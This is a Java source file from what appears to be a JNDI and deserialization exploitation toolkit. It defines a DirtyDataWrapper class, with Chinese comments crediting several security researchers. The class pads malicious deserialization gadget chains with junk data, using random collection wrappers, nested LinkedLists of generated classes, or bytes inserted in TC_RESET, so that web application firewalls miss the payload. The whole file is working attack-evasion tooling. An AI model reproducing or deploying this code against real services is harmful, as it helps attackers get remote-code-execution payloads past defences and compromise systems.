package com.qi4l.jndi.gadgets.utils.dirty;

import com.qi4l.jndi.gadgets.Config.Config;
import com.qi4l.jndi.gadgets.utils.Utils;

import java.util.*;
import java.util.concurrent.ThreadLocalRandom;

/**
 * 来自 c0ny1
 * <p>
 * Java反序列化数据绕WAF之加大量脏数据
 * 链接：https://gv7.me/articles/2021/java-deserialize-data-bypass-waf-by-adding-a-lot-of-dirty-data/
 */
public class DirtyDataWrapper {

    // 脏数据大小
    private final int dirtyDataSize;

    private final int dirtyDataType;

    // gadget 对象
    private final Object gadget; //  gadget对象

    public DirtyDataWrapper(Object gadget, int dirtyDataType, int dirtyDataSize) {
        this.gadget = gadget;
        this.dirtyDataType = dirtyDataType;
        this.dirtyDataSize = dirtyDataSize;
    }

    /**
     * 脏数据填充反序列化利用链
     *
     * @return 返回包裹后的反序列化数据
     */
    public Object doWrap() {

        Object wrapper = null;

        // 如果混淆长度为 0 则不混淆
        if (dirtyDataSize == 0) {
            return gadget;
        }

        switch (dirtyDataType) {
            // type 为 1 时，随机使用 ArrayList/LinkedList/HashMap/LinkedHashMap/TreeMap 等集合类型来封装 object，并指定脏数据大小
            // by c0ny1
            case 1:
                // 生成随机字符串
                String dirtyData = new RandomString((dirtyDataSize), ThreadLocalRandom.current()).getString();
                String randStr1 = new RandomString((int) (Math.random() * 10) % 10 + 1, ThreadLocalRandom.current()).getString();
                String randStr2 = new RandomString((int) (Math.random() * 10) % 10 + 1, ThreadLocalRandom.current()).getString();
                // 随机选择封装对象
                int type = (int) (Math.random() * 10) % 10 + 1;
                switch (type) {
                    case 0:
                        List<Object> arrayList = new ArrayList<Object>();
                        arrayList.add(dirtyData);
                        arrayList.add(gadget);
                        wrapper = arrayList;
                        break;
                    case 1:
                        List<Object> linkedList = new LinkedList<Object>();
                        linkedList.add(dirtyData);
                        linkedList.add(gadget);
                        wrapper = linkedList;
                        break;
                    case 2:
                        HashMap<String, Object> map = new HashMap<String, Object>();
                        map.put(randStr1, dirtyData);
                        map.put(randStr2, gadget);
                        wrapper = map;
                        break;
                    case 3:
                        LinkedHashMap<String, Object> linkedHashMap = new LinkedHashMap<String, Object>();
                        linkedHashMap.put(randStr1, dirtyData);
                        linkedHashMap.put(randStr2, gadget);
                        wrapper = linkedHashMap;
                        break;
                    default:
                    case 4:
                        TreeMap<String, Object> treeMap = new TreeMap<String, Object>();
                        treeMap.put(randStr1, dirtyData);
                        treeMap.put(randStr2, gadget);
                        wrapper = treeMap;
                        break;
                }
                break;
            // type 为 2 时，使用循环嵌套 LinkedList 来封装 object
            // by Y4tacker
            case 2:
                List<Object> linkedList = new LinkedList<Object>();
                for (int i = 0; i < dirtyDataSize; i++) {
                    linkedList.add(Utils.makeClass("A" + System.nanoTime()));
                }
                linkedList.add(gadget);
                wrapper = linkedList;
                break;
            // type 为 3 时，在 TC_RESET 中加入脏数据
            // by phith0n
            case 3:
                Config.IS_DIRTY_IN_TC_RESET = true;
                Config.DIRTY_LENGTH_IN_TC_RESET = dirtyDataSize;
                wrapper = gadget;
                break;
        }

        return wrapper;
    }

}
